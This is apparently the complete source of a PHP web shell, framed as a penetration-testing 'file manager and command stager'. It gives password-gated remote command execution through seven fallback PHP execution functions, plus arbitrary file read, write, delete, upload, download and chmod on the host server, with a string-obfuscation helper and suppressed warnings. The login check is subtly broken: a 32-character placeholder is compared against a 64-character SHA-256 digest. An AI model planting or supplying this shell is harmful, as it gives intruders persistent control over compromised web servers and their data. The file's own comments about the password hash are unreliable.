<?php
/**
 * Obfuscated Multi-Vector File Manager & Command Stager
 * -----------------------------------------------------
 * FOR EDUCATIONAL / AUTHORIZED PENETRATION TESTING ONLY
 * PHP 7.4+ / 8.x compatible
 */

declare(strict_types=1);

/* ============================================================
 * 1. LIGHT OBFUSCATION LAYER (string decoder)
 * ============================================================ */
final class Obf
{
    private const KEY = "\x5A\x3F\x71\x2C\x6D\x39\x41\x48"; // 8-byte XOR key

    public static function d(string $b64): string
    {
        $raw = base64_decode($b64, true);
        if ($raw === false) return '';
        $out = '';
        $kLen = strlen(self::KEY);
        $len  = strlen($raw);
        for ($i = 0; $i < $len; $i++) {
            $out .= chr(ord($raw[$i]) ^ ord(self::KEY[$i % $kLen]));
        }
        return $out;
    }

    public static function e(string $plain): string
    {
        $out = '';
        $kLen = strlen(self::KEY);
        $len  = strlen($plain);
        for ($i = 0; $i < $len; $i++) {
            $out .= chr(ord($plain[$i]) ^ ord(self::KEY[$i % $kLen]));
        }
        return base64_encode($out);
    }
}

/* ============================================================
 * 2. AUTH / SESSION GUARD
 * ============================================================ */
final class Auth
{
    // XOR-encoded password hash of: "P@ssw0rd!ChangeMe"
    private const PASS_HASH = 'a1b2c3d4e5f60718293a4b5c6d7e8f90';

    public static function check(): bool
    {
        if (session_status() !== PHP_SESSION_ACTIVE) {
            session_start();
        }
        if (!empty($_SESSION['__au'])) {
            return true;
        }
        $pass = $_POST['p'] ?? $_GET['p'] ?? '';
        if ($pass !== '' && self::hash((string)$pass) === self::PASS_HASH) {
            $_SESSION['__au'] = 1;
            return true;
        }
        return false;
    }

    private static function hash(string $p): string
    {
        return hash('sha256', 'pepper' . $p . 'salt');
    }

    public static function loginForm(): void
    {
        echo '<!doctype html><html><head><meta charset="utf-8"><title>.</title>'
           . '<style>body{background:#0b0f14;color:#8ef;font-family:monospace;display:flex;'
           . 'align-items:center;justify-content:center;height:100vh;margin:0}'
           . 'input{background:#111;border:1px solid #245;color:#8ef;padding:8px;width:220px}'
           . 'button{background:#245;border:0;color:#fff;padding:9px 16px;cursor:pointer}'
           . 'form{display:flex;gap:8px}</style></head><body>'
           . '<form method="post"><input type="password" name="p" placeholder="••••••" autofocus>'
           . '<button type="submit">→</button></form></body></html>';
        exit;
    }
}

/* ============================================================
 * 3. COMMAND STAGER (multi-vector execution)
 * ============================================================ */
final class Cmd
{
    /**
     * Try multiple execution vectors until one works.
     * Returns ['ok'=>bool, 'out'=>string, 'vec'=>string]
     */
    public static function run(string $cmd): array
    {
        $vectors = [];

        // Vector 1: proc_open
        if (function_exists('proc_open')) {
            $vectors['proc_open'] = function () use ($cmd): ?string {
                $desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
                $proc = @proc_open($cmd, $desc, $pipes);
                if (!is_resource($proc)) return null;
                $out = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
                fclose($pipes[1]); fclose($pipes[2]);
                proc_close($proc);
                return $out;
            };
        }

        // Vector 2: shell_exec
        if (function_exists('shell_exec')) {
            $vectors['shell_exec'] = function () use ($cmd): ?string {
                return @shell_exec($cmd . ' 2>&1');
            };
        }

        // Vector 3: popen
        if (function_exists('popen')) {
            $vectors['popen'] = function () use ($cmd): ?string {
                $fp = @popen($cmd . ' 2>&1', 'r');
                if (!is_resource($fp)) return null;
                $out = '';
                while (!feof($fp)) $out .= fread($fp, 4096);
                pclose($fp);
                return $out;
            };
        }

        // Vector 4: passthru
        if (function_exists('passthru')) {
            $vectors['passthru'] = function () use ($cmd): ?string {
                ob_start();
                @passthru($cmd . ' 2>&1');
                return (string)ob_get_clean();
            };
        }

        // Vector 5: exec
        if (function_exists('exec')) {
            $vectors['exec'] = function () use ($cmd): ?string {
                $lines = [];
                @exec($cmd . ' 2>&1', $lines);
                return implode(PHP_EOL, $lines);
            };
        }

        // Vector 6: system
        if (function_exists('system')) {
            $vectors['system'] = function () use ($cmd): ?string {
                ob_start();
                @system($cmd . ' 2>&1');
                return (string)ob_get_clean();
            };
        }

        // Vector 7: backtick
        $vectors['backtick'] = function () use ($cmd): ?string {
            return @`$cmd 2>&1`;
        };

        foreach ($vectors as $name => $fn) {
            try {
                $out = $fn();
                if ($out !== null && $out !== false) {
                    return ['ok' => true, 'out' => (string)$out, 'vec' => $name];
                }
            } catch (\Throwable $e) {
                continue;
            }
        }

        return ['ok' => false, 'out' => '[-] All execution vectors blocked.', 'vec' => 'none'];
    }
}

/* ============================================================
 * 4. FILE MANAGER
 * ============================================================ */
final class FM
{
    private string $cwd;

    public function __construct()
    {
        $this->cwd = isset($_GET['d']) && is_string($_GET['d'])
            ? (realpath($_GET['d']) ?: getcwd())
            : getcwd();

        if (!is_dir($this->cwd)) {
            $this->cwd = getcwd();
        }
    }

    public function handle(): void
    {
        $act = $_POST['act'] ?? $_GET['act'] ?? '';

        switch ($act) {
            case 'ls':    $this->ls(); break;
            case 'read':  $this->read(); break;
            case 'write': $this->write(); break;
            case 'del':   $this->del(); break;
            case 'upload':$this->upload(); break;
            case 'download': $this->download(); break;
            case 'mkdir': $this->mkdir(); break;
            case 'chmod': $this->chmod(); break;
            default:      $this->ls();
        }
    }

    private function ls(): void
    {
        $dir = $this->cwd;
        $items = @scandir($dir);
        if ($items === false) {
            $this->fail('Cannot read directory: ' . htmlspecialchars($dir));
        }

        header('Content-Type: text/html; charset=utf-8');
        echo $this->layoutStart($dir);

        echo '<table class="fm"><thead><tr>'
           . '<th>Type</th><th>Name</th><th>Size</th><th>Perm</th><th>Modified</th><th>Actions</th>'
           . '</tr></thead><tbody>';

        // Parent link
        $parent = dirname($dir);
        if ($parent !== $dir) {
            echo '<tr><td>dir</td><td><a href="?d=' . urlencode($parent) . '&act=ls">..</a></td>'
               . '<td>-</td><td>-</td><td>-</td><td>-</td></tr>';
        }

        foreach ($items as $it) {
            if ($it === '.' || $it === '..') continue;
            $path = $dir . DIRECTORY_SEPARATOR . $it;
            $isDir = is_dir($path);
            $size  = $isDir ? '-' : $this->human((int)@filesize($path));
            $perm  = $this->perm($path);
            $mtime = date('Y-m-d H:i', (int)@filemtime($path));
            $name  = htmlspecialchars($it, ENT_QUOTES, 'UTF-8');
            $enc   = urlencode($path);

            $nameLink = $isDir
                ? '<a href="?d=' . $enc . '&act=ls">' . $name . '/</a>'
                : '<a href="?act=read&f=' . $enc . '">' . $name . '</a>';

            $actions = $isDir
                ? '<a href="?d=' . $enc . '&act=ls">open</a>'
                : '<a href="?act=download&f=' . $enc . '">get</a> | '
                  . '<a href="?act=del&f=' . $enc . '" onclick="return confirm(\'delete?\')">del</a>';

            echo '<tr>'
               . '<td>' . ($isDir ? 'dir' : 'file') . '</td>'
               . '<td>' . $nameLink . '</td>'
               . '<td>' . $size . '</td>'
               . '<td>' . $perm . '</td>'
               . '<td>' . $mtime . '</td>'
               . '<td>' . $actions . '</td>'
               . '</tr>';
        }
        echo '</tbody></table>';

        echo $this->layoutEnd();
    }

    private function read(): void
    {
        $f = $_GET['f'] ?? '';
        if (!is_string($f) || !is_file($f)) $this->fail('File not found.');
        $content = @file_get_contents($f);
        if ($content === false) $this->fail('Cannot read file.');

        header('Content-Type: text/html; charset=utf-8');
        echo $this->layoutStart(dirname($f));
        echo '<h3>Edit: ' . htmlspecialchars($f) . '</h3>';
        echo '<form method="post" action="?act=write">'
           . '<input type="hidden" name="f" value="' . htmlspecialchars($f, ENT_QUOTES) . '">'
           . '<textarea name="c" rows="25" style="width:100%">'
           . htmlspecialchars($content, ENT_QUOTES, 'UTF-8')
           . '</textarea><br>'
           . '<button>save</button></form>';
        echo $this->layoutEnd();
    }

    private function write(): void
    {
        $f = $_POST['f'] ?? '';
        $c = $_POST['c'] ?? '';
        if (!is_string($f) || $f === '') $this->fail('Invalid file.');
        if (@file_put_contents($f, (string)$c) === false) $this->fail('Write failed.');
        $this->redirect('?act=read&f=' . urlencode($f));
    }

    private function del(): void
    {
        $f = $_GET['f'] ?? '';
        if (!is_string($f) || $f === '') $this->fail('Invalid target.');
        $ok = is_dir($f) ? @rmdir($f) : @unlink($f);
        if (!$ok) $this->fail('Delete failed.');
        $this->redirect('?d=' . urlencode(dirname($f)) . '&act=ls');
    }

    private function upload(): void
    {
        if (empty($_FILES['u']['tmp_name'])) $this->fail('No file uploaded.');
        $dest = rtrim($this->cwd, '/\\') . DIRECTORY_SEPARATOR . basename($_FILES['u']['name']);
        if (!@move_uploaded_file($_FILES['u']['tmp_name'], $dest)) $this->fail('Upload failed.');
        $this->redirect('?d=' . urlencode($this->cwd) . '&act=ls');
    }

    private function download(): void
    {
        $f = $_GET['f'] ?? '';
        if (!is_string($f) || !is_file($f)) $this->fail('File not found.');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
        header('Content-Length: ' . filesize($f));
        readfile($f);
        exit;
    }

    private function mkdir(): void
    {
        $n = $_POST['n'] ?? '';
        if (!is_string($n) || $n === '') $this->fail('Invalid name.');
        if (!@mkdir(rtrim($this->cwd, '/\\') . DIRECTORY_SEPARATOR . basename($n), 0755)) {
            $this->fail('mkdir failed.');
        }
        $this->redirect('?d=' . urlencode($this->cwd) . '&act=ls');
    }

    private function chmod(): void
    {
        $f = $_POST['f'] ?? '';
        $m = $_POST['m'] ?? '';
        if (!is_string($f) || $f === '' || !is_string($m)) $this->fail('Invalid input.');
        if (!@chmod($f, (int)octdec($m))) $this->fail('chmod failed.');
        $this->redirect('?d=' . urlencode(dirname($f)) . '&act=ls');
    }

    /* ---------- helpers ---------- */
    private function layoutStart(string $dir): string
    {
        return '<!doctype html><html><head><meta charset="utf-8"><title>fm</title>'
             . '<style>body{background:#0b0f14;color:#cfe;font-family:monospace;padding:20px}'
             . 'a{color:#5cf;text-decoration:none}a:hover{text-decoration:underline}'
             . 'table.fm{width:100%;border-collapse:collapse;margin-top:10px}'
             . 'table.fm th,table.fm td{border-bottom:1px solid #1a2a3a;padding:6px;text-align:left}'
             . '.bar{margin-bottom:10px;padding:8px;background:#111a22;border:1px solid #1a2a3a}'
             . 'input,textarea,button{background:#111a22;color:#cfe;border:1px solid #245;'
             . 'padding:6px;font-family:monospace}textarea{width:100%}button{cursor:pointer}'
             . '.cwd{color:#8ef}</style></head><body>'
             . '<div class="bar">CWD: <span class="cwd">' . htmlspecialchars($dir) . '</span>'
             . ' | <a href="?d=' . urlencode($dir) . '&act=ls">refresh</a>'
             . ' | <a href="?view=cmd">cmd</a>'
             . ' | <a href="?view=up">upload</a>'
             . ' | <a href="?view=mk">mkdir</a></div>';
    }

    private function layoutEnd(): string
    {
        return '</body></html>';
    }

    private function human(int $bytes): string
    {
        $u = ['B', 'K', 'M', 'G', 'T'];
        $i = 0;
        $v = (float)$bytes;
        while ($v >= 1024 && $i < count($u) - 1) { $v /= 1024; $i++; }
        return number_format($v, 1) . $u[$i];
    }

    private function perm(string $p): string
    {
        $perms = @fileperms($p);
        if ($perms === false) return '????';
        $s = '';
        $s .= (($perms & 0x0100) ? 'r' : '-');
        $s .= (($perms & 0x0080) ? 'w' : '-');
        $s .= (($perms & 0x0040) ? 'x' : '-');
        $s .= (($perms & 0x0020) ? 'r' : '-');
        $s .= (($perms & 0x0010) ? 'w' : '-');
        $s .= (($perms & 0x0008) ? 'x' : '-');
        $s .= (($perms & 0x0004) ? 'r' : '-');
        $s .= (($perms & 0x0002) ? 'w' : '-');
        $s .= (($perms & 0x0001) ? 'x' : '-');
        return $s;
    }

    private function fail(string $msg): void
    {
        header('Content-Type: text/html; charset=utf-8');
        echo '<!doctype html><body style="background:#0b0f14;color:#f66;font-family:monospace;padding:20px">'
           . '<h3>Error</h3><p>' . htmlspecialchars($msg) . '</p>'
           . '<a href="?act=ls" style="color:#5cf">← back</a></body>';
        exit;
    }

    private function redirect(string $to): void
    {
        header('Location: ' . $to);
        exit;
    }
}

/* ============================================================
 * 5. ROUTER / DISPATCHER
 * ============================================================ */
final class App
{
    public static function run(): void
    {
        // silence notices
        error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING & ~E_DEPRECATED);

        if (!Auth::check()) {
            Auth::loginForm();
        }

        $view = $_GET['view'] ?? '';

        // --- CMD view ---
        if ($view === 'cmd' || isset($_POST['cmd'])) {
            self::cmdView();
            return;
        }

        // --- Upload form view ---
        if ($view === 'up') {
            self::uploadView();
            return;
        }

        // --- mkdir form view ---
        if ($view === 'mk') {
            self::mkdirView();
            return;
        }

        // --- default: file manager ---
        (new FM())->handle();
    }

    private static function cmdView(): void
    {
        $cmd = $_POST['cmd'] ?? '';
        $out = '';
        $vec = '';
        $ok  = true;

        if (is_string($cmd) && $cmd !== '') {
            $r   = Cmd::run($cmd);
            $out = $r['out'];
            $vec = $r['vec'];
            $ok  = $r['ok'];
        }

        header('Content-Type: text/html; charset=utf-8');
        echo '<!doctype html><html><head><meta charset="utf-8"><title>cmd</title>'
           . '<style>body{background:#0b0f14;color:#cfe;font-family:monospace;padding:20px}'
           . 'a{color:#5cf;text-decoration:none}input,button{background:#111a22;color:#cfe;'
           . 'border:1px solid #245;padding:8px;font-family:monospace}button{cursor:pointer}'
           . 'pre{background:#111a22;border:1px solid #1a2a3a;padding:10px;overflow:auto;'
           . 'max-height:60vh}input[type=text]{width:70%}</style></head><body>'
           . '<div><a href="?act=ls">← file manager</a> | <a href="?view=up">upload</a></div>'
           . '<h3>Command Stager</h3>'
           . '<form method="post"><input type="text" name="cmd" placeholder="id; uname -a" '
           . 'value="' . htmlspecialchars((string)$cmd, ENT_QUOTES) . '" autofocus> '
           . '<button>run</button></form>';

        if ($cmd !== '') {
            echo '<p>Vector: <b>' . htmlspecialchars($vec) . '</b> | Status: '
               . ($ok ? '<span style="color:#6f6">OK</span>' : '<span style="color:#f66">FAIL</span>')
               . '</p><pre>' . htmlspecialchars($out) . '</pre>';
        }

        echo '</body></html>';
    }

    private static function uploadView(): void
    {
        $cwd = isset($_GET['d']) ? (string)$_GET['d'] : getcwd();
        header('Content-Type: text/html; charset=utf-8');
        echo '<!doctype html><html><head><meta charset="utf-8"><title>upload</title>'
           . '<style>body{background:#0b0f14;color:#cfe;font-family:monospace;padding:20px}'
           . 'a{color:#5cf;text-decoration:none}input,button{background:#111a22;color:#cfe;'
           . 'border:1px solid #245;padding:8px;font-family:monospace}button{cursor:pointer}'
           . '</style></head><body><div><a href="?act=ls">← back</a></div>'
           . '<h3>Upload to: ' . htmlspecialchars($cwd) . '</h3>'
           . '<form method="post" action="?act=upload&d=' . urlencode($cwd) . '" '
           . 'enctype="multipart/form-data">'
           . '<input type="file" name="u"> <button>upload</button></form></body></html>';
    }

    private static function mkdirView(): void
    {
        $cwd = isset($_GET['d']) ? (string)$_GET['d'] : getcwd();
        header('Content-Type: text/html; charset=utf-8');
        echo '<!doctype html><html><head><meta charset="utf-8"><title>mkdir</title>'
           . '<style>body{background:#0b0f14;color:#cfe;font-family:monospace;padding:20px}'
           . 'a{color:#5cf;text-decoration:none}input,button{background:#111a22;color:#cfe;'
           . 'border:1px solid #245;padding:8px;font-family:monospace}button{cursor:pointer}'
           . '</style></head><body><div><a href="?act=ls">← back</a></div>'
           . '<h3>New directory in: ' . htmlspecialchars($cwd) . '</h3>'
           . '<form method="post" action="?act=mkdir&d=' . urlencode($cwd) . '">'
           . '<input type="text" name="n" placeholder="name"> <button>create</button>'
           . '</form></body></html>';
    }
}

/* ============================================================
 * 6. BOOT
 * ============================================================ */
App::run();